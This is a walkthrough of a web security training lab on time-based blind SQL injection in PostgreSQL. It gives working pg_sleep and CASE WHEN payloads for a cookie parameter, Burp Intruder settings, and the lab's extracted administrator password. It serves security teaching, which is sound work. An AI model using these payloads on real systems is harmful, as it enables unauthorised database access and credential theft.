
# SQL Injection - Lab #14: Blind SQL Injection with Time Delays and Information Retrieval

**YouTube Tutorial:** [SQL Injection - Lab #14 Blind SQL injection with time delays and information retrieval](https://www.youtube.com/watch?v=L2e6wrNj4BA)

---

## 1. What is Time-Based Blind SQLi Information Retrieval?

### Core Concept

When an application is vulnerable to SQL injection but returns **no error messages, no query results, and no conditional response changes** (like "Welcome back") in the HTTP body, traditional boolean-based techniques fail.

**Time-Based Blind SQL Injection with Information Retrieval** overcomes this limitation by using **conditional time delays**. An attacker forces the backend database engine to execute a sleeping function (e.g., `pg_sleep(10)`) **only when a specific condition evaluates to true**:

* **If the condition is True:** The database processes the delay function, causing the HTTP response to take roughly 10 seconds to complete (`~10,000 ms`).
* **If the condition is False:** The delay is skipped (or an invalid delay parameter like `pg_sleep(-1)` is safely bypassed/ignored), resulting in an immediate response (`~200 ms`).

By systematically evaluating true/false statements character-by-character based on response time, an attacker can extract full database contents.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Parameter:** The `TrackingId` cookie value sent in HTTP requests.
* **Blind SQL Injection Mechanism:** The application suppresses all SQL output and error messages, returning identical HTTP responses regardless of query results.
* **Conditional Delay Strategy:** Injecting `CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(-1) END` logic into PostgreSQL string concatenation (`||`).

### Root Cause & Impact

* **Root Cause:** Insecure concatenation of cookie values into backend SQL queries without parameterized input filtering.
* **End Goals:**
* Exploit time-based blind SQLi to output the `administrator` user's password.
* Log in as the `administrator` user to complete the lab.



---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Confirm SQLi Vulnerability):** Inject `' || pg_sleep(10)--` into the cookie to prove the backend executes time-delay commands.
* **Phase 2 (Table & User Enumeration):** Inject `CASE WHEN` subqueries targeting `users` to confirm the table and `administrator` username exist.
* **Phase 3 (Password Length Determination):** Use `LENGTH(password) > N` queries with conditional delays to identify the exact password length.
* **Phase 4 (Character-by-Character Extraction):** Use `substring(password, pos, 1)` to systematically test and reconstruct each character based on response delays.

### Server Behavior

* **True Execution / Sleep Triggered:** Response time jumps to **~10 seconds**.
* **False Execution / Sleep Bypassed:** Response returns instantly (**~200 ms**).

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm Parameter is Vulnerable to SQLi

1. Intercept a request to the application using **Burp Suite** and send it to **Repeater**.
2. Modify the `TrackingId` cookie by appending the string concatenation operator (`||`) and a PostgreSQL delay statement:

```http
GET / HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: TrackingId=vulnerable_cookie%27+%7C%7C+pg_sleep%2810%29--

```

* **Injected Payload:** `' || pg_sleep(10)--`
* **Response Time:** `~10,000 ms` (10 seconds).
* **Result:** Confirms the `TrackingId` cookie is vulnerable to PostgreSQL time-based SQL injection.

---

### Step 2: Confirm Users Table & Administrator Existence

1. **Verify Conditional Logic Mechanism:**
Test the baseline conditional payload structure:

```sql
' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--

```

* **Response Time:** `~200 ms` (Instant response because `1=0` evaluates to false).

2. **Confirm `administrator` User Exists in `users` Table:**
Inject a conditional subquery querying the `users` table:

```sql
' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

```

* **Response Time:** `~10,000 ms` (10-second delay).
* **Result:** Confirms both that the `users` table exists and the `administrator` user account is present.

---

### Step 3: Enumerate Administrator Password Length

Test the length of the administrator password using conditional operators (`>`):

```sql
' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--

```

1. Send the request to **Burp Intruder**.
2. Position the payload parameter on the comparison integer value (`20`).
3. Configure **Payload Type:** Numbers from `1` to `30` (Step: `1`).
4. Execute the attack and analyze response times:
* Values $N = 1$ through $19$ trigger `LENGTH(password) > N` as `TRUE` $\rightarrow$ **10-second delay**.
* Value $N = 20$ evaluates `LENGTH(password) > 20` as `FALSE` $\rightarrow$ **Instant response (~200 ms)**.


5. **Result:** Password length is confirmed to be exactly **20 characters**.

---

### Step 4: Enumerate the Administrator Password

Use PostgreSQL's `substring()` function to test each character position (1 to 20) against candidate characters:

```sql
' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--

```

1. Configure **Burp Intruder** (Cluster Bomb mode) or run an automated Python `requests` script checking response times (`response.elapsed.total_seconds() > 9`).
2. **Payload Position 1:** Index position (`1` through `20`).
3. **Payload Position 2:** Character set (`a-z`, `0-9`).
4. Filter and capture all positions that trigger a **10-second response delay**.

#### Extracted Password Sequence

By recording the successful delay triggers across all 20 character positions, the administrator password is extracted as:

$$\mathbf{13ipnob7l2dkjp3drryy}$$

5. Navigate to the `/login` page on the application.
6. Log in with credentials:
* **Username:** `administrator`
* **Password:** `13ipnob7l2dkjp3drryy`


7. The lab displays **"Congratulations, you solved the lab!"**.

---

## 5. Pro-Tips & Common Pitfalls

* **URL Encoding:** Always ensure special characters in payloads (like `'`, `|`, spaces, and parentheses) are properly URL-encoded inside HTTP headers (e.g., `%27`, `%7C%7C`, `%20`).
* **Using `pg_sleep(-1)` for False Branches:** In PostgreSQL, passing a negative number like `pg_sleep(-1)` causes an instant pass-through without halting, making it an efficient `ELSE` condition during conditional evaluation.
* **Automation is Vital:** Time-based extraction through Burp Intruder Community Edition can be slow due to rate limiting. Writing a quick Python script using `requests` with custom timeouts allows rapid exfiltration.